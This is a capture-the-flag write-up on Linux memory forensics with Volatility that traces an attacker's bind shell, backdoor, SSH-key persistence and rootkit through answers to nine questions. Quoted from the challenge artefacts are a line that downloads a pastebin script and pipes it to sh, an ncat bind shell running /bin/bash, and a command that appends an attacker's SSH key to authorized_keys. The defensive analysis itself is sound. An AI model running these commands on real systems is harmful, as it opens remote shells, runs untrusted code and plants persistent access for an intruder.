# Seized

The Scenario:

> Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.

## Q1. What is the CentOS version installed on the machine?

The archive name provides the kernel version, using the [CentOS Wikipedia page](https://en.wikipedia.org/wiki/CentOS) you will see that the corresponding CentOS version is `7.7-1908`.

## Q2. There is a command containing a strange message in the bash history. Will you be able to read it?

Using `linux_bash` plugin we could see that the user put content in a file : `echo "c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=" > y0ush0uldr34dth1s.txt`. Decode the base64 using cyberchef gives the flag.

## Q3. What is the PID of the suspicious process?

`linux_pstree` shows more than 200 processes. Instead to explore each of them, a clever way is to directly focuse on strange processes using `linux_malfind` : 

```log
Process: gnome-terminal- Pid: 2535 Address: 0x7f1d414bf000 File: Anonymous Mapping
Protection: VM_READ|VM_WRITE|VM_EXEC
Flags: VM_READ|VM_WRITE|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|VM_ACCOUNT|VM_CAN_NONLINEAR

0x007f1d414bf000  78 5f 00 00 00 00 00 00 00 00 00 00 00 00 00 00   x_..............
0x007f1d414bf010  53 41 57 41 56 41 55 55 48 8b df 48 81 ec 50 02   SAWAVAUUH..H..P.
0x007f1d414bf020  00 00 48 8b 43 10 48 83 e8 01 48 8d 74 24 58 48   ..H.C.H...H.t$XH
0x007f1d414bf030  c7 c1 13 00 00 00 48 89 46 08 48 8d 76 08 48 83   ......H.F.H.v.H.
```

Exploring this PID on the `pstree`, proove that there is something suspicious, as `insmod` is used to insert modules into the kernel : 

```log
...
.gnome-terminal-     2535            1000
..gnome-pty-helpe    2621            1000
..bash               2622            1000
...sudo              3612
....insmod           3614
...
```

**Unfortunately, that's none of them.** Suspicious activity is not always malicious.

Exploring again the `pstree`, we can see something else suspicious :

```log
.ncat                2854
..bash               2876
...python            2886
....bash             2887
.....vim             3196
```

This one is more suspicious than the previous one because of the `ncat` (network process) launching some scripts.

## Q4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?

I was unable to find this answer. I tried to list all the cached files using `linux_cached_file` to see if there is some suspicious one and dump it, but I found nothing. I tried to dump the suspicious process but without results too.

I also tried the github present in the bash history but I didn't see the hidden line pushed to the right : 

```python3
os.system('wget -O - https://pastebin.com/raw/nQwMKjtZ 2>/dev/null|sh')
```

A write-up gave me the flag because the links seems not valid anymore. This pastebin should contains a base64 strings which is the flag :

```bash
### Congratz : c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo=
nohup ncat -lvp 12345 -4 -e /bin/bash > /dev/null 2>/dev/null &
```

## Q5. What are the attacker's IP address and the local port on the targeted machine?

Using `linux_netstat` returns a lot of information but at the end of the output we could see theses lines : 

```log
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  ncat/2854 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2876 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                python/2886 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2887 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                   vim/3196 
```

The **local** port is the one written in the script above, and the attacker's IP address is the other.

## Q6. What is the first command that the attacker executed?

We can't see other commands with `linux_bash`, a different way to investigate on this kind of clues is the `linux_psaux` plug-in. The output bottom is interesting, as it contains the malware related command line arguments :

```log
2854   0      0      ncat -lvp 12345 -4 -e /bin/bash
2876   0      0      /bin/bash
2886   0      0      python -c import pty; pty.spawn("/bin/bash")
2887   0      0      /bin/bash
3196   0      0      vim /etc/rc.local
3271   0      0      /usr/sbin/abrt-dbus -t133
3279   89     89     cleanup -z -t unix -u
3280   89     89     trivial-rewrite -n rewrite -t unix -u
3281   0      0      local -t unix
3299   0      0      sleep 60
3612   0      0      sudo insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
3614   0      0      insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
```

Just after the `netcat`, the attackers run `python -c import pty; pty.spawn("/bin/bash")`.

## Q7. After changing the user password, we found that the attacker still has access. Can you find out how?

This question is quite hard. First, you have to investigate on the `vim` process. Why this process?

- we didn't care of it yet

- it's a part of the cyber kill chain

- intuition I guess?

After dumping the process using `linux_dump_map`, we could see that the process memory contains lot of information. It contains so much that is difficult to know what to look for. We are looking for malware persistence mecanisms, we can try to ask to ChatGPT what are the most famous persistence mecanism. We can investigate on several answer but the good one is SSH keys. If we search on these files for ssh-things, we will find the answer :

```logs
strings *.vma|grep -i 'ssh'

#!/bin/sh 
     # Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=
    
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
    "/etc/rc.local" 3L, 596C
    1,1           
    All zed_keys> /home/k3vin/.ssh/authorized_keys && 
    chmod 600 /home/k3vin/.ssh/authori
```

The first base64 encoded string is the flag. It's interesting to capitalize on knowledge to understand this persistance mecanism :

**This code add a SSH key for the K3vin user and modify its permissions in a manner that only this user can modify it.**

## Q8. What is the name of the rootkit that the attacker used?

Thanks to this tutorial, [Analyzing Linux Rootkits with Volatility](https://downloads.volatilityfoundation.org/omfw/2012/OMFW2012_Case.pdf), we learned some ways to detect rootkit on a Linux system. One of them is to investigate on syscalls using `linux_check_syscall`. This command returns lot of information but we are only interested in the hooked syscalls.

```logs
Table Name Index System Call              Handler Address    Symbol                                                      
---------- ----- ------------------------ ------------------ ------------------------------------------------------------
64bit         88                          0xffffffffc0a12470 HOOKED: sysemptyrect/syscall_callback
...
64bit        332                          0x6461625f6e726177 HOOKED: UNKNOWN
```

Firstly, I was quite lost ; how can I find the rootkit name ? In fact, the `Symbol` column contains the rootkit name here.

## Q9. The rootkit uses crc65 encryption. What is the key?

Firstly, I searched on internet if this rootkit has a known crc65 encryption key. I found many Write-Up but searching `sysemptyrect` in the dump file (using `grep` for example) will give you the key.